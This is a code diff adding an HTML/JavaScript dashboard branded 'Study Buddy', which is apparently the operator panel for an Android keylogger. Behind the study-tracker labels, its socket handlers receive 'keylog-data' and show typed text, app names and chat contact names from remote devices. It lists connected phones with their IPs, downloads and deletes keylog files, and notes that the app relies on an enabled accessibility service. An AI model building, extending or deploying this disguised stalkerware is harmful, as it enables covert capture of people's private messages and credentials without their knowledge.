@@ -1,0 +1,1071 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Study Buddy Dashboard</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/pako/2.1.0/pako.min.js"></script>
+    <script src="/socket.io/socket.io.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            margin-bottom: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 10px;
+        }
+        
+        .header p {
+            font-size: 1.1rem;
+            color: #666;
+            font-weight: 300;
+        }
+        
+        .dashboard {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .card {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 20px;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .card h2 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #333;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
+        }
+        
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            font-size: 0.9rem;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+        
+        .controls {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+            margin-bottom: 30px;
+        }
+        
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.3);
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(102, 126, 234, 0.4);
+        }
+        
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.9);
+            color: #333;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+        }
+        
+        .btn-secondary:hover {
+            background: rgba(255, 255, 255, 1);
+            transform: translateY(-1px);
+        }
+        
+        .btn-danger {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.3);
+        }
+        
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(255, 107, 107, 0.4);
+        }
+        
+        .btn-success {
+            background: linear-gradient(135deg, #4ecdc4, #44a08d);
+            color: white;
+            box-shadow: 0 8px 25px rgba(78, 205, 196, 0.3);
+        }
+        
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 35px rgba(78, 205, 196, 0.4);
+        }
+        
+        .connection-status {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 15px 20px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .status-indicator {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #ff6b6b;
+            animation: pulse 2s infinite;
+        }
+        
+        .status-indicator.connected {
+            background: #4ecdc4;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        .logs-container {
+            max-height: 400px;
+            overflow-y: auto;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.9);
+        }
+        
+        .log-item {
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.05);
+            transition: all 0.3s ease;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        .log-item:hover {
+            background: rgba(102, 126, 234, 0.05);
+        }
+        
+        .log-item:last-child {
+            border-bottom: none;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        
+        .log-app {
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 500;
+        }
+        
+        .log-time {
+            color: #666;
+            font-size: 0.85rem;
+        }
+        
+        .log-text {
+            background: #f8f9fa;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin: 8px 0;
+            font-family: 'Monaco', 'Menlo', monospace;
+            font-size: 0.9rem;
+            border-left: 4px solid #667eea;
+            word-break: break-word;
+        }
+        
+        .log-chat {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a52);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 15px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            margin: 5px 0;
+            display: inline-block;
+        }
+        
+        .log-details {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 8px;
+        }
+        
+        .log-detail {
+            font-size: 0.8rem;
+            color: #666;
+        }
+        
+        .log-detail strong {
+            color: #333;
+        }
+        
+        .file-list {
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .file-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            margin-bottom: 10px;
+            background: rgba(255, 255, 255, 0.9);
+            transition: all 0.3s ease;
+        }
+        
+        .file-item:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+        }
+        
+        .file-info {
+            flex: 1;
+        }
+        
+        .file-name {
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        
+        .file-size {
+            font-size: 0.8rem;
+            color: #666;
+        }
+        
+        .file-actions {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .btn-small {
+            padding: 4px 8px;
+            font-size: 0.75rem;
+            border-radius: 4px;
+        }
+        
+        .connection-management {
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 30px;
+            margin-bottom: 30px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+        }
+        
+        .connection-dropdown {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            background: white;
+            font-size: 0.95rem;
+            margin-bottom: 20px;
+        }
+        
+        .connection-info {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 12px;
+            margin-top: 20px;
+        }
+        
+        .connection-info h3 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        .info-item {
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .info-label {
+            font-size: 0.8rem;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        
+        .info-value {
+            font-weight: 500;
+            color: #333;
+        }
+        
+        .info-value.warning {
+            color: #ff6b6b;
+        }
+        
+        .empty-state {
+            text-align: center;
+            padding: 40px;
+            color: #666;
+        }
+        
+        .empty-state h3 {
+            margin-bottom: 10px;
+            color: #333;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(102, 126, 234, 0.3);
+            border-radius: 50%;
+            border-top-color: #667eea;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .alert {
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+        
+        .alert-success {
+            background: rgba(78, 205, 196, 0.1);
+            color: #44a08d;
+            border: 1px solid rgba(78, 205, 196, 0.3);
+        }
+        
+        .alert-error {
+            background: rgba(255, 107, 107, 0.1);
+            color: #ee5a52;
+            border: 1px solid rgba(255, 107, 107, 0.3);
+        }
+        
+        .alert-warning {
+            background: rgba(255, 193, 7, 0.1);
+            color: #e0a800;
+            border: 1px solid rgba(255, 193, 7, 0.3);
+        }
+        
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+            
+            .controls {
+                flex-direction: column;
+            }
+            
+            .btn {
+                justify-content: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📚 Study Buddy Dashboard</h1>
+            <p>Monitor study sessions and track progress in real-time</p>
+        </div>
+        
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalLogs">0</div>
+                <div class="stat-label">Total Logs</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="connectedDevices">0</div>
+                <div class="stat-label">Connected Devices</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="liveStatus">OFF</div>
+                <div class="stat-label">Live Logging</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="logFiles">0</div>
+                <div class="stat-label">Log Files</div>
+            </div>
+        </div>
+        
+        <div class="connection-management">
+            <h2>🔗 Connection Management</h2>
+            <div class="connection-status">
+                <div class="status-indicator" id="connectionStatusIndicator"></div>
+                <span id="connectionStatusText">Connecting...</span>
+            </div>
+            
+            <select class="connection-dropdown" id="connectionDropdown">
+                <option value="">Select a device...</option>
+            </select>
+            
+            <div class="controls">
+                <button class="btn btn-primary" onclick="reconnectSelected()">
+                    🔄 Reconnect Selected
+                </button>
+                <button class="btn btn-secondary" onclick="loadConnections()">
+                    🔄 Refresh
+                </button>
+                <button class="btn btn-secondary" onclick="reconnectWithManualIP()">
+                    🔧 Manual IP
+                </button>
+                <button class="btn btn-danger" onclick="removeSelected()">
+                    🗑️ Remove Selected
+                </button>
+                <button class="btn btn-danger" onclick="removeAllConnections()">
+                    🗑️ Delete All Connections
+                </button>
+                <button class="btn btn-success" onclick="forceRestartApp()">
+                    🔄 Force Restart App
+                </button>
+            </div>
+            
+            <div class="connection-info" id="connectionInfo" style="display: none;">
+                <h3>Device Information</h3>
+                <div class="info-grid" id="connectionDetails"></div>
+            </div>
+        </div>
+        
+        <div class="dashboard">
+            <div class="card">
+                <h2>📊 Live Study Logs</h2>
+                <div class="controls">
+                    <button class="btn btn-primary" onclick="toggleLiveKeylogging()">
+                        <span id="liveToggleText">Enable Live Logging</span>
+                    </button>
+                    <button class="btn btn-secondary" onclick="clearLogs()">
+                        🗑️ Clear Logs
+                    </button>
+                </div>
+                <div class="logs-container" id="logsContainer">
+                    <div class="empty-state">
+                        <h3>No logs yet</h3>
+                        <p>Enable live logging to see real-time study activity</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2>📁 Log Files</h2>
+                <div class="controls">
+                    <button class="btn btn-primary" onclick="fetchLogFiles()">
+                        📂 Load Files
+                    </button>
+                    <button class="btn btn-success" onclick="downloadAllLogs()">
+                        📥 Download All
+                    </button>
+                </div>
+                <div class="file-list" id="fileList">
+                    <div class="empty-state">
+                        <h3>No files loaded</h3>
+                        <p>Click "Load Files" to see available log files</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let socket = io();
+        let logs = [];
+        let selectedConnection = null;
+        let downloadAllRequested = false;
+        
+        // Initialize connection
+        socket.on('connect', function() {
+            console.log('Connected to server');
+            updateConnectionStatus(true);
+            loadConnections();
+        });
+        
+        socket.on('disconnect', function() {
+            console.log('Disconnected from server');
+            updateConnectionStatus(false);
+        });
+        
+        // Live keylogging status
+        socket.on('live-keylogging-status', function(data) {
+            updateLiveStatus(data.enabled);
+        });
+        
+        // Receive live keylogs
+        socket.on('keylog-data', function(data) {
+            addKeylogToDisplay(data);
+        });
+        
+        // File management
+        socket.on('log-files-response', function(data) {
+            console.log('📁 Received log-files-response from server:', data);
+            console.log('📊 Files data:', data.files);
+            displayLogFiles(data.files);
+            if (downloadAllRequested) {
+                downloadAllRequested = false;
+                data.files.forEach(file => {
+                    setTimeout(() => downloadLogFile(file.date), 1000);
+                });
+            }
+        });
+        
+        socket.on('log-file-download', async function(data) {
+            try {
+                let content;
+                if (data.compressed) {
+                    // Decompress GZIP data
+                    const binaryString = atob(data.content);
+                    const bytes = new Uint8Array(binaryString.length);
+                    for (let i = 0; i < binaryString.length; i++) {
+                        bytes[i] = binaryString.charCodeAt(i);
+                    }
+                    
+                    if (typeof pako !== 'undefined') {
+                        // Use Pako library
+                        content = pako.inflate(bytes, { to: 'string' });
+                    } else {
+                        // Fallback to browser's DecompressionStream
+                        const stream = new DecompressionStream('gzip');
+                        const writer = stream.writable.getWriter();
+                        const reader = stream.readable.getReader();
+                        
+                        writer.write(bytes);
+                        writer.close();
+                        
+                        const chunks = [];
+                        while (true) {
+                            const { done, value } = await reader.read();
+                            if (done) break;
+                            chunks.push(value);
+                        }
+                        
+                        const result = new Uint8Array(chunks.reduce((acc, chunk) => acc + chunk.length, 0));
+                        let offset = 0;
+                        for (const chunk of chunks) {
+                            result.set(chunk, offset);
+                            offset += chunk.length;
+                        }
+                        content = new TextDecoder().decode(result);
+                    }
+                } else {
+                    content = atob(data.content);
+                }
+                
+                const blob = new Blob([content], { type: 'text/plain' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `keylogs_${data.date}.txt`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(url);
+                
+                showAlert('File downloaded successfully!', 'success');
+            } catch (error) {
+                console.error('Download error:', error);
+                showAlert('Error downloading file: ' + error.message, 'error');
+            }
+        });
+        
+        socket.on('log-file-delete-confirm', function(data) {
+            showAlert('File deleted successfully!', 'success');
+            fetchLogFiles();
+        });
+        
+        // Connection management
+        function loadConnections() {
+            fetch('/api/connections')
+                .then(response => response.json())
+                .then(data => {
+                    populateConnectionDropdown(data.connections);
+                })
+                .catch(error => {
+                    console.error('Error loading connections:', error);
+                    showAlert('Error loading connections', 'error');
+                });
+        }
+        
+        function populateConnectionDropdown(connections) {
+            const dropdown = document.getElementById('connectionDropdown');
+            dropdown.innerHTML = '<option value="">Select a device...</option>';
+            
+            connections.forEach(conn => {
+                const option = document.createElement('option');
+                option.value = conn.id;
+                option.textContent = `${conn.name} (${conn.isOnline ? 'Online' : 'Offline'})`;
+                if (conn.isOnline) {
+                    option.style.color = '#4ecdc4';
+                } else {
+                    option.style.color = '#ff6b6b';
+                }
+                dropdown.appendChild(option);
+            });
+        }
+        
+        function selectConnection() {
+            const dropdown = document.getElementById('connectionDropdown');
+            const connectionId = dropdown.value;
+            
+            if (!connectionId) {
+                document.getElementById('connectionInfo').style.display = 'none';
+                selectedConnection = null;
+                return;
+            }
+            
+            fetch('/api/connections')
+                .then(response => response.json())
+                .then(data => {
+                    selectedConnection = data.connections.find(c => c.id === connectionId);
+                    if (selectedConnection) {
+                        displayConnectionInfo(selectedConnection);
+                    }
+                });
+        }
+        
+        function displayConnectionInfo(connection) {
+            const infoDiv = document.getElementById('connectionInfo');
+            const detailsDiv = document.getElementById('connectionDetails');
+            
+            detailsDiv.innerHTML = `
+                <div class="info-item">
+                    <div class="info-label">Device Name</div>
+                    <div class="info-value">${connection.name}</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">OS</div>
+                    <div class="info-value">${connection.os || 'Unknown'}</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Client IP</div>
+                    <div class="info-value">${connection.clientIP}</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Connected At</div>
+                    <div class="info-value">${new Date(connection.connectedAt).toLocaleString()}</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Last Seen</div>
+                    <div class="info-value">${connection.lastSeen ? new Date(connection.lastSeen).toLocaleString() : 'Never'}</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Reconnect IP</div>
+                    <div class="info-value ${connection.reconnectIP === 'Unknown' || connection.reconnectIP.includes(':') ? 'warning' : ''}">${connection.reconnectIP}</div>
+                </div>
+                ${connection.localIP ? `
+                <div class="info-item">
+                    <div class="info-label">Device Local IP</div>
+                    <div class="info-value">${connection.localIP}</div>
+                </div>
+                ` : ''}
+            `;
+            
+            infoDiv.style.display = 'block';
+        }
+        
+        function reconnectSelected() {
+            if (!selectedConnection) {
+                showAlert('Please select a device first', 'warning');
+                return;
+            }
+            
+            const reconnectIP = selectedConnection.reconnectIP;
+            if (reconnectIP === 'Unknown' || reconnectIP.includes(':')) {
+                showAlert('Invalid IP address for reconnection. Please use Manual IP option.', 'warning');
+                return;
+            }
+            
+            fetch('/api/reconnect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    connectionId: selectedConnection.id,
+                    reconnectIP: reconnectIP
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showAlert('Reconnection request sent successfully!', 'success');
+                } else {
+                    showAlert('Reconnection failed: ' + data.error, 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Reconnection error:', error);
+                showAlert('Error sending reconnection request: ' + error.message, 'error');
+            });
+        }
+        
+        function reconnectWithManualIP() {
+            const ip = prompt('Enter device IP address:');
+            if (!ip) return;
+            
+            if (!/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/.test(ip)) {
+                showAlert('Please enter a valid IPv4 address', 'warning');
+                return;
+            }
+            
+            fetch('/api/reconnect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    reconnectIP: ip
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showAlert('Reconnection request sent successfully!', 'success');
+                } else {
+                    showAlert('Reconnection failed: ' + data.error, 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Reconnection error:', error);
+                showAlert('Error sending reconnection request: ' + error.message, 'error');
+            });
+        }
+        
+        function forceRestartApp() {
+            const instructions = `
+To restart the Study Buddy app:
+1. Go to Android Settings > Apps > Study Buddy
+2. Tap "Force Stop"
+3. Open the Study Buddy app again
+4. Make sure the accessibility service is enabled
+
+Alternatively, restart your device.
+            `;
+            
+            alert(instructions);
+            
+            // Also send a broadcast reconnect
+            fetch('/api/reconnect', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    forceRestart: true
+                })
+            });
+        }
+        
+        function removeSelected() {
+            if (!selectedConnection) {
+                showAlert('Please select a device first', 'warning');
+                return;
+            }
+            
+            if (!confirm('Are you sure you want to remove this device?')) return;
+            
+            fetch(`/api/connections/${selectedConnection.id}`, {
+                method: 'DELETE'
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showAlert('Device removed successfully!', 'success');
+                    loadConnections();
+                    document.getElementById('connectionInfo').style.display = 'none';
+                    selectedConnection = null;
+                } else {
+                    showAlert('Error removing device: ' + data.error, 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Remove error:', error);
+                showAlert('Error removing device: ' + error.message, 'error');
+            });
+        }
+        
+        function removeAllConnections() {
+            if (!confirm('Are you sure you want to delete ALL connections? This action cannot be undone!')) return;
+            
+            fetch('/api/connections/delete-all', {
+                method: 'DELETE'
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    showAlert('All connections deleted successfully!', 'success');
+                    loadConnections();
+                    document.getElementById('connectionInfo').style.display = 'none';
+                    selectedConnection = null;
+                } else {
+                    showAlert('Error deleting connections: ' + data.error, 'error');
+                }
+            })
+            .catch(error => {
+                console.error('Delete all error:', error);
+                showAlert('Error deleting connections: ' + error.message, 'error');
+            });
+        }
+        
+        // Live logging controls
+        function toggleLiveKeylogging() {
+            socket.emit('toggle-live-keylogging');
+        }
+        
+        function updateLiveStatus(enabled) {
+            const statusElement = document.getElementById('liveStatus');
+            const toggleText = document.getElementById('liveToggleText');
+            
+            if (enabled) {
+                statusElement.textContent = 'ON';
+                statusElement.style.color = '#4ecdc4';
+                toggleText.textContent = 'Disable Live Logging';
+            } else {
+                statusElement.textContent = 'OFF';
+                statusElement.style.color = '#ff6b6b';
+                toggleText.textContent = 'Enable Live Logging';
+            }
+        }
+        
+        function updateConnectionStatus(connected) {
+            const indicator = document.getElementById('connectionStatusIndicator');
+            const text = document.getElementById('connectionStatusText');
+            
+            if (connected) {
+                indicator.classList.add('connected');
+                text.textContent = 'Connected to server';
+            } else {
+                indicator.classList.remove('connected');
+                text.textContent = 'Disconnected from server';
+            }
+        }
+        
+        function addKeylogToDisplay(data) {
+            const container = document.getElementById('logsContainer');
+            
+            // Remove empty state if present
+            const emptyState = container.querySelector('.empty-state');
+            if (emptyState) {
+                emptyState.remove();
+            }
+            
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-item';
+            
+            const time = new Date(data.timestamp).toLocaleTimeString();
+            const textDisplay = data.text ? 
+                '<div class="log-text">' + data.text + '</div>' : '';
+            
+            const chatDisplay = data.chatName && data.chatName !== 'Unknown' ? 
+                '<div class="log-chat">👤 ' + data.chatName + '</div>' : '';
+            
+            logEntry.innerHTML = 
+                '<div class="log-header">' +
+                    '<div class="log-app">' + (data.package || 'Unknown App') + '</div>' +
+                    '<div class="log-time">' + time + '</div>' +
+                '</div>' +
+                textDisplay +
+                chatDisplay +
+                '<div class="log-details">' +
+                    '<div class="log-detail"><strong>View:</strong> ' + (data.viewId || 'Unknown') + '</div>' +
+                    '<div class="log-detail"><strong>Hint:</strong> ' + (data.hint || 'None') + '</div>' +
+                '</div>';
+            
+            container.insertBefore(logEntry, container.firstChild);
+            
+            // Keep only last 50 logs
+            const logs = container.querySelectorAll('.log-item');
+            if (logs.length > 50) {
+                container.removeChild(logs[logs.length - 1]);
+            }
+            
+            // Update stats
+            updateStats();
+        }
+        
+        function updateStats() {
+            const logItems = document.querySelectorAll('.log-item');
+            document.getElementById('totalLogs').textContent = logItems.length;
+        }
+        
+        function clearLogs() {
+            const container = document.getElementById('logsContainer');
+            container.innerHTML = '<div class="empty-state"><h3>No logs yet</h3><p>Enable live logging to see real-time study activity</p></div>';
+            updateStats();
+        }
+        
+        // File management
+        function fetchLogFiles() {
+            console.log('📁 Requesting log files from server...');
+            socket.emit('request-log-files');
+        }
+        
+        function displayLogFiles(files) {
+            console.log('📁 displayLogFiles called with:', files);
+            const container = document.getElementById('fileList');
+            
+            if (!files || files.length === 0) {
+                console.log('📁 No files to display');
+                container.innerHTML = '<div class="empty-state"><h3>No files found</h3><p>No log files available on the device</p></div>';
+                return;
+            }
+            
+            console.log('📁 Displaying', files.length, 'files');
+            
+            container.innerHTML = '';
+            files.forEach(file => {
+                const fileItem = document.createElement('div');
+                fileItem.className = 'file-item';
+                
+                fileItem.innerHTML = `
+                    <div class="file-info">
+                        <div class="file-name">${file.name}</div>
+                        <div class="file-size">${file.size}</div>
+                    </div>
+                    <div class="file-actions">
+                        <button class="btn btn-primary btn-small" onclick="downloadLogFile('${file.date}')">
+                            📥 Download
+                        </button>
+                        <button class="btn btn-secondary btn-small" onclick="viewLogContent('${file.date}')">
+                            👁️ View Content
+                        </button>
+                        <button class="btn btn-danger btn-small" onclick="deleteLogFile('${file.date}')">
+                            🗑️ Delete
+                        </button>
+                    </div>
+                `;
+                
+                container.appendChild(fileItem);
+            });
+            
+            document.getElementById('logFiles').textContent = files.length;
+        }
+        
+        function downloadLogFile(date) {
+            socket.emit('download-log-file', { date: date });
+        }
+        
+        function deleteLogFile(date) {
+            if (!confirm('Are you sure you want to delete this log file?')) return;
+            socket.emit('delete-log-file', { date: date });
+        }
+        
+        function viewLogContent(date) {
+            localStorage.setItem('selectedLogDate', date);
+            window.open('viewer.html', '_blank');
+        }
+        
+        function downloadAllLogs() {
+            downloadAllRequested = true;
+            fetchLogFiles();
+        }
+        
+        function showAlert(message, type) {
+            const alert = document.createElement('div');
+            alert.className = `alert alert-${type}`;
+            alert.textContent = message;
+            
+            document.body.insertBefore(alert, document.body.firstChild);
+            
+            setTimeout(() => {
+                alert.remove();
+            }, 5000);
+        }
+        
+        // Initialize
+        document.getElementById('connectionDropdown').addEventListener('change', selectConnection);
+        loadConnections();
+        updateConnectionStatus(socket.connected);
+    </script>
+</body>
+</html>
